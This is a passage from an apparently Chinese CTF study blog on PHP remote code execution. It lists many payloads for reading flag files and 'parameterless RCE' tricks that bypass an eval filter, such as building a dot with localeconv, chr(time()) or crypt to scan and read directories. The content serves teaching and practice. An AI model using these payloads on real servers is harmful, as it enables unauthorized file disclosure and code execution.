</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">c</span><span class="o">=</span><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s1">&#39;glob:///*&#39;</span><span class="p">);</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$a</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="nv">$f</span><span class="o">-&gt;</span><span class="na">getFilename</span><span class="p">()</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="p">);}</span> <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="42文件读取">4.2文件读取：
</h3><p>读取文件的函数有很多，比如我要读flag.php,如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mf">1.</span><span class="nx">show_source</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mf">2.</span><span class="nx">highlight_file</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">)</span><span class="c1">#highlight_file(glob(&#34;/f*&#34;)[0]);配合glob可以用通配符
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mf">4.</span><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mf">5.</span><span class="k">require</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mf">6.</span><span class="k">require_once</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mf">7.</span><span class="nx">readfile</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="mf">9.</span><span class="k">try</span><span class="p">{</span><span class="nv">$dbh</span><span class="o">=</span><span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">&#39;mysql:host=localhost;dbname=ctftraining&#39;</span><span class="p">,</span><span class="s1">&#39;root&#39;</span><span class="p">,</span><span class="s1">&#39;root&#39;</span><span class="p">);</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$dbh</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;select load_file(&#34;/flag36d.txt&#34;)&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$row</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;|&#34;</span><span class="p">;</span> <span class="p">}</span><span class="nv">$dbh</span><span class="o">=</span> <span class="k">null</span><span class="p">;}</span><span class="k">catch</span><span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$e</span><span class="p">){</span><span class="k">echo</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();}</span><span class="k">die</span><span class="p">();</span>		<span class="c1">#ctfshow72题，数据库读文件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mf">10.</span><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mf">11.</span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">file</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">));</span><span class="c1">//file — 把整个文件读入一个数组中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mf">12.</span><span class="nx">print_r</span><span class="p">(</span><span class="nx">file</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mf">13.</span><span class="nx">通过fopen去读取文件内容，这里介绍下函数</span>
</span></span><span class="line"><span class="cl"><span class="nx">fread</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nx">fgets</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nx">fgetc</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nx">fgetss</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nx">fgetcsv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nx">gpassthru</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nx">payload</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">);</span><span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$a</span><span class="p">))</span> <span class="p">{</span><span class="nv">$line</span> <span class="o">=</span> <span class="nx">fgets</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="k">echo</span> <span class="nv">$line</span><span class="p">;}</span><span class="c1">//一行一行读取
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">);</span><span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$a</span><span class="p">))</span> <span class="p">{</span><span class="nv">$line</span> <span class="o">=</span> <span class="nx">fgetc</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="k">echo</span> <span class="nv">$line</span><span class="p">;}</span><span class="c1">//一个一个字符读取
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">);</span><span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$a</span><span class="p">))</span> <span class="p">{</span><span class="nv">$line</span> <span class="o">=</span> <span class="nx">fgetcsv</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$line</span><span class="p">);}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">);</span><span class="k">echo</span> <span class="nx">fread</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="s2">&#34;1000&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">);</span><span class="k">echo</span> <span class="nx">fpassthru</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mf">14.</span><span class="nx">非正常读取直接看：</span>
</span></span><span class="line"><span class="cl"><span class="nx">copy</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">,</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">rename</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">,</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mf">15.</span><span class="nx">原生类读flag</span>
</span></span><span class="line"><span class="cl"><span class="k">new</span>  <span class="nx">SplFileObject</span><span class="p">(</span><span class="s1">&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</span><span class="p">)</span><span class="nx">：</span><span class="c1">#为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等，可以配合伪协议读取文件
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="五eval中无参数文件读取">五：eval中无参数文件读取
</h2><p>无参数rce一般类似与这种</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="s1">&#39;;&#39;</span> <span class="o">===</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[^\W]+\((?R)?\)/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]))</span> <span class="p">{</span>    
</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">正则表达式 [^\W]+\((?R)?\) 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。简而言之，无参数rce就是不使用参数，而只使用一个个函数最终达到目的。
</span></span></code></pre></td></tr></table>
</div>
</div><p>先介绍一下相关函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">scandir</span><span class="p">()</span> <span class="o">:</span><span class="nx">将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob</span><span class="p">()</span><span class="nx">可替换）</span>
</span></span><span class="line"><span class="cl"><span class="nx">localeconv</span><span class="p">()</span> <span class="nx">：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘</span><span class="o">.</span><span class="nx">’，这个</span><span class="o">.</span><span class="nx">的用处很大）</span>
</span></span><span class="line"><span class="cl"><span class="nx">current</span><span class="p">()</span> <span class="nx">：返回数组中的单元，默认取第一个值。pos</span><span class="p">()</span><span class="nx">和current</span><span class="p">()</span><span class="nx">是同一个东西</span>
</span></span><span class="line"><span class="cl"><span class="nx">getcwd</span><span class="p">()</span> <span class="o">:</span><span class="nx">取得当前工作目录</span>
</span></span><span class="line"><span class="cl"><span class="nx">dirname</span><span class="p">()</span><span class="o">:</span><span class="nx">函数返回路径中的目录部分</span>
</span></span><span class="line"><span class="cl"><span class="nx">array_flip</span><span class="p">()</span> <span class="o">:</span><span class="nx">交换数组中的键和值，成功时返回交换后的数组</span>
</span></span><span class="line"><span class="cl"><span class="nx">array_rand</span><span class="p">()</span> <span class="o">:</span><span class="nx">从数组中随机取出一个或多个单元</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">array_reverse</span><span class="p">()</span><span class="o">:</span><span class="nx">将数组内容反转</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">strrev</span><span class="p">()</span><span class="o">:</span><span class="nx">用于反转给定字符串</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">getcwd</span><span class="p">()</span><span class="nx">：获取当前工作目录路径</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">dirname</span><span class="p">()</span> <span class="nx">：函数返回路径中的目录部分。如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径</span>
</span></span><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">()</span> <span class="nx">：函数改变当前的目录。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">()</span><span class="nx">、assert</span><span class="p">()</span><span class="nx">：命令执行</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">hightlight_file</span><span class="p">()</span><span class="nx">、show_source</span><span class="p">()</span><span class="nx">、readfile</span><span class="p">()</span><span class="nx">：读取文件内容</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="51文件读取之查看当前目录">5.1文件读取之查看当前目录
</h3><h4 id="1利用getcwd">1.利用getcwd
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(scandir(getcwd()));
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="2如果getcwd被禁用了咋搞用localeconv">2.如果getcwd被禁用了咋搞，用<code>localeconv()</code>
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">如果我们想要返回当前目录下的所有文件和目录，就需要用到</span><span class="n">scandir</span><span class="p">()</span><span class="err">函数，但是这个函数需要一个参数</span><span class="o">$</span><span class="n">directory去指定要扫描的目录路径</span><span class="err">。所以我们需要</span><span class="n">scandir</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="err">函数调用会扫描当前目录，那么我们怎么去构造这个小数点呢？这里就需要用到能返回小数点的函数</span><span class="n">localeconv</span><span class="p">()</span><span class="err">，</span><span class="n">localeconv</span><span class="p">()</span><span class="err">的数组的第一个就是小数点，然后我们通过</span><span class="n">current</span><span class="p">()</span><span class="err">函数去读取数组的第一个元素，这样就能构造一个小数点，结合这些我们的</span><span class="n">payload构造就有</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">current</span><span class="p">(</span><span class="nx">localeconv</span><span class="p">())));</span>
</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">pos</span><span class="p">(</span><span class="nx">localeconv</span><span class="p">())));</span>
</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">reset</span><span class="p">(</span><span class="nx">localeconv</span><span class="p">())));</span>	<span class="c1">#记得print_r的平替var_dump,var_export等等
</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="3如果localeconv禁用怎么办就用chr">3.如果localeconv禁用怎么办，就用<strong>chr</strong>
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">chr</span><span class="p">(</span><span class="mi">46</span><span class="p">)</span><span class="sb">`就是字符`</span><span class="s2">&#34;.&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">怎么构造46呢？</span>
</span></span><span class="line"><span class="cl"><span class="nx">rand</span><span class="p">()</span><span class="nx">函数：返回一个随机数</span>
</span></span><span class="line"><span class="cl"><span class="mf">1.</span><span class="nx">chr</span><span class="p">(</span><span class="nx">rand</span><span class="p">())</span><span class="c1">//不实际，得看运气
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mf">2.</span><span class="nx">chr</span><span class="p">(</span><span class="nx">time</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nx">chr</span><span class="p">()</span><span class="nx">函数以256为一个周期，所以chr</span><span class="p">(</span><span class="mi">46</span><span class="p">),</span><span class="nx">chr</span><span class="p">(</span><span class="mi">302</span><span class="p">),</span><span class="nx">chr</span><span class="p">(</span><span class="mi">558</span><span class="p">)</span><span class="nx">都等于</span><span class="s2">&#34;.&#34;</span><span class="nx">。所以使用chr</span><span class="p">(</span><span class="nx">time</span><span class="p">())</span><span class="nx">，一个周期必定出现一次</span><span class="s2">&#34;.&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">time</span><span class="p">())));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122140857019.png"
	width="1807"
	height="248"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122140857019_hu_5e32557cbaea1d70.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122140857019_hu_735f4fa7c06652f3.png 1024w"
	loading="lazy"
	
		alt="image-20251122140857019"
	
	
		class="gallery-image" 
		data-flex-grow="728"
		data-flex-basis="1748px"
	
></p>
<h4 id="4phpversion函数">4.phpversion()函数
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">这个方法比较撇，所以如果其他方法行不通再用这个方法</span>
</span></span><span class="line"><span class="cl"><span class="nx">phpversion</span><span class="p">()</span><span class="sb">`返回PHP版本，如`</span><span class="mf">5.5</span><span class="o">.</span><span class="mi">9</span>
</span></span><span class="line"><span class="cl"><span class="nx">floor</span><span class="p">(</span><span class="nx">phpversion</span><span class="p">())</span><span class="nx">返回</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">sqrt</span><span class="p">(</span><span class="nx">floor</span><span class="p">(</span><span class="nx">phpversion</span><span class="p">()))</span><span class="nx">返回2</span><span class="o">.</span><span class="mi">2360679774998</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">tan</span><span class="p">(</span><span class="nx">floor</span><span class="p">(</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">floor</span><span class="p">(</span><span class="nx">phpversion</span><span class="p">()))))</span><span class="nx">返回</span><span class="o">-</span><span class="mf">2.1850398632615</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">cosh</span><span class="p">(</span><span class="nx">tan</span><span class="p">(</span><span class="nx">floor</span><span class="p">(</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">floor</span><span class="p">(</span><span class="nx">phpversion</span><span class="p">())))))</span><span class="nx">返回4</span><span class="o">.</span><span class="mi">5017381103491</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">sinh</span><span class="p">(</span><span class="nx">cosh</span><span class="p">(</span><span class="nx">tan</span><span class="p">(</span><span class="nx">floor</span><span class="p">(</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">floor</span><span class="p">(</span><span class="nx">phpversion</span><span class="p">()))))))</span><span class="nx">返回45</span><span class="o">.</span><span class="mi">081318677156</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">ceil</span><span class="p">(</span><span class="nx">sinh</span><span class="p">(</span><span class="nx">cosh</span><span class="p">(</span><span class="nx">tan</span><span class="p">(</span><span class="nx">floor</span><span class="p">(</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">floor</span><span class="p">(</span><span class="nx">phpversion</span><span class="p">())))))))</span><span class="nx">返回46</span>
</span></span><span class="line"><span class="cl"><span class="nx">chr</span><span class="p">(</span><span class="nx">ceil</span><span class="p">(</span><span class="nx">sinh</span><span class="p">(</span><span class="nx">cosh</span><span class="p">(</span><span class="nx">tan</span><span class="p">(</span><span class="nx">floor</span><span class="p">(</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">floor</span><span class="p">(</span><span class="nx">phpversion</span><span class="p">()))))))))</span><span class="nx">返回</span><span class="s2">&#34;.&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))));
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122161859059.png"
	width="1885"
	height="262"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122161859059_hu_8f946d625c2e6b85.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122161859059_hu_494a62bde33e64f6.png 1024w"
	loading="lazy"
	
		alt="image-20251122161859059"
	
	
		class="gallery-image" 
		data-flex-grow="719"
		data-flex-basis="1726px"
	
></p>
<p><a class="link" href="https://zhuanlan.zhihu.com/p/157431794"  target="_blank" rel="noopener"
    >无参数读文件和RCE总结 - 知乎</a></p>
<h4 id="5crypt">5.<strong>crypt()</strong>
</h4><p><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值，第一个字符随机是<code>$</code>(大概率) 或者 <code>&quot;.&quot;</code>(小概率) 然后通过<code>chr(ord())</code>只取第一个字符(<code>ord()返回字符串中第一个字符的Ascii值</code>)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">hebrevc</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">time</span><span class="p">()))))));</span><span class="c1">//（多刷新几次）
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">同理：strrev(crypt(serialize(array())))也可以得到&#34;.&#34;，只不过crypt(serialize(array()))的点出现在最后一个字符，需要使用strrev()逆序，然后使用chr(ord())获取第一个字符
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">())))))));</span>	<span class="c1">#还有几率打印根目录
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122160832513.png"
	width="1872"
	height="193"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122160832513_hu_f13c34b3f2d41592.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122160832513_hu_d1f3dfebd65f2146.png 1024w"
	loading="lazy"
	
		alt="image-20251122160832513"
	
	
		class="gallery-image" 
		data-flex-grow="969"
		data-flex-basis="2327px"
	
></p>
<p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122161749693.png"
	width="1818"
	height="152"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122161749693_hu_d641720cf48b16f8.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122161749693_hu_2eae59491622e350.png 1024w"
	loading="lazy"
	
		alt="image-20251122161749693"
	
	
		class="gallery-image" 
		data-flex-grow="1196"
		data-flex-basis="2870px"
	
></p>
<h3 id="52读取当前目录文件">5.2读取当前目录文件
</h3><h4 id="用array_randarray_flip爆破">用array_rand+array_flip爆破
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">show_source(array_rand(array_flip(scandir(getcwd()))));
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="用nextarray_reverse">用next+array_reverse
</h4><p>比如ctfshow40题，flag.php在数组倒数第二。</p>
<p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122170509975.png"
	width="1850"
	height="187"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122170509975_hu_d2fe7c1e50c1ac56.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251122170509975_hu_aaf33684aec2cf54.png 1024w"
	loading="lazy"
	
		alt="image-20251122170509975"
	
	
		class="gallery-image" 
		data-flex-grow="989"
		data-flex-basis="2374px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
